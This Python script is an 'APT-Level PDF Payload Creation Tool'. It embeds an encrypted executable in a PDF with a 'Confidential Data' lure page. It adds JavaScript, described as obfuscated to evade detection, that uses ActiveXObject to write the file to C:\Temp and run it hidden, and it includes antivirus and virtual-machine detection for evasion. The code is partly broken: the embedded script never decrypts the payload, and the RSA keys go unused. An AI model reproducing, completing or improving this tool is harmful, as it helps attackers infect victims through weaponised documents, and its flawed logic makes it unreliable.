import os
import time
import base64
import random
import string
import subprocess
import psutil
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from io import BytesIO
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from rich.console import Console
from rich.table import Table
from tkinter import Tk
from tkinter.filedialog import askopenfilename

# Initialize Rich Console for clean output
console = Console()

# Define a function to clear the console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Define a function to display a banner
def display_banner():
    console.print("[bold magenta]APT-Level PDF Payload Creation Tool[/bold magenta]")
    console.print("[bold cyan]-----------------------------------------------[/bold cyan]")

# Utility functions for encryption and key generation
def generate_asymmetric_keys():
    """Generate RSA private and public keys."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=4096,
        backend=default_backend()
    )
    return private_key, private_key.public_key()

def rsa_encrypt(data, public_key):
    """Encrypt data using RSA public key."""
    return public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def aes_encrypt(data, key):
    """Encrypt data with AES-256-CBC."""
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padded_data = data + b'\0' * (16 - len(data) % 16)  # AES block padding
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext

def generate_key():
    """Generate a symmetric AES-256 key."""
    return os.urandom(32)

# Environment Fingerprinting with enhanced evasion
def environment_fingerprinting():
    """Gather system environment information for evasion."""
    try:
        info = {
            "os_version": os.name,
            "architecture": os.uname().machine,
            "user": os.getenv("USER"),
            "antivirus": detect_antivirus(),
            "vm_check": check_virtual_environment(),
        }
        return info
    except Exception as e:
        console.print(f"[red]Error gathering environment info: {e}[/red]")
        return {}

def detect_antivirus():
    """Detect presence of common antivirus software using signature checks."""
    av_signatures = ["avast", "avg", "bitdefender", "kaspersky", "mcafee", "norton", "defender"]
    return any(sig in (p.name().lower() for p in psutil.process_iter()) for sig in av_signatures)

def check_virtual_environment():
    """Check for virtualization markers to avoid execution in VMs."""
    vm_markers = ["vmware", "virtualbox", "qemu", "vbox"]
    return any(marker in (p.name().lower() for p in psutil.process_iter()) for marker in vm_markers)

# File and PDF utilities
def random_filename(extension=".exe"):
    """Generate a random filename."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + extension

def embed_payload_in_pdf(output_pdf_path, payload, symmetric_key, existing_pdf_path=None):
    """Create a PDF with an embedded encrypted payload."""
    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    c.drawString(100, 750, "Confidential Data - Restricted Access")
    c.save()
    buffer.seek(0)

    writer = PdfWriter()
    if existing_pdf_path:
        with open(existing_pdf_path, "rb") as f:
            reader = PdfReader(f)
            writer.append(reader)
    else:
        writer.add_page(PdfReader(buffer).pages[0])

    # Obfuscated JavaScript to evade basic detection
    js_payload = f"""
        var enc_key = "{base64.urlsafe_b64encode(symmetric_key).decode()}";
        var enc_payload = "{base64.urlsafe_b64encode(payload).decode()}";
        
        function decodeBase64(b64) {{
            var bin = atob(b64); 
            var bin_length = bin.length;
                        var bytes = new Uint8Array(bin_length);
            for (var i = 0; i < bin_length; i++) {{
                bytes[i] = bin.charCodeAt(i);
            }}
            return bytes;
        }}

        function executePayload() {{
            try {{
                var fso = new ActiveXObject("Scripting.FileSystemObject");
                var tempFile = "C:\\\\Temp\\\\" + "{random_filename()}";
                var file = fso.CreateTextFile(tempFile, true);
                var decrypted = decodeBase64(enc_payload);
                file.Write(decrypted);
                file.Close();

                var shell = new ActiveXObject("WScript.Shell");
                shell.Run(tempFile, 0);
                console.log("APT payload executed");
            }} catch (e) {{
                console.log("Execution error: " + e.message);
            }}
        }}

        executePayload();
    """
    writer.add_js(js_payload)
    with open(output_pdf_path, "wb") as f:
        writer.write(f)
    console.print(f"[green]APT PDF payload created at {output_pdf_path}[/green]")

def select_file():
    """Prompt the user to select a binary file."""
    Tk().withdraw()
    file_path = askopenfilename(filetypes=[
        ("Executable files", "*.exe"),
        ("Binary files", "*.bin"),
        ("All files", "*.*")
    ])
    return file_path

def read_binary_file(file_path):
    """Read binary file content."""
    with open(file_path, 'rb') as f:
        return f.read()

# Main execution
def main():
    clear_console()
    display_banner()

    console.print("[bold cyan]Select a binary file to embed in the PDF[/bold cyan]")
    file_path = select_file()
    if not file_path:
        console.print("[red]No file selected, exiting.[/red]")
        return

    payload = read_binary_file(file_path)
    symmetric_key = generate_key()
    private_key, public_key = generate_asymmetric_keys()
    encrypted_payload = aes_encrypt(payload, symmetric_key)
    encrypted_symmetric_key = rsa_encrypt(symmetric_key, public_key)

    console.print("[bold cyan]Enter output PDF name (with .pdf extension)[/bold cyan]")
    output_pdf_path = input("> ") or "apt_payload.pdf"

    console.print("[bold cyan]Enter existing PDF path (or leave blank for new)[/bold cyan]")
    existing_pdf_path = input("> ").strip()

    embed_payload_in_pdf(output_pdf_path, encrypted_payload, symmetric_key, existing_pdf_path or None)

    # Display results
    env_info = environment_fingerprinting()
    table = Table(title="APT Payload Information")
    table.add_column("Detail", style="cyan")
    table.add_column("Value", style="magenta")

    table.add_row("Payload File", os.path.basename(file_path))
    table.add_row("Encrypted Payload", base64.urlsafe_b64encode(encrypted_payload).decode())
    table.add_row("Encrypted Symmetric Key", base64.urlsafe_b64encode(encrypted_symmetric_key).decode())
    table.add_row("Target PDF", output_pdf_path)
    table.add_row("Environment Info", str(env_info))

    console.print(table)

if __name__ == "__main__":
    main()
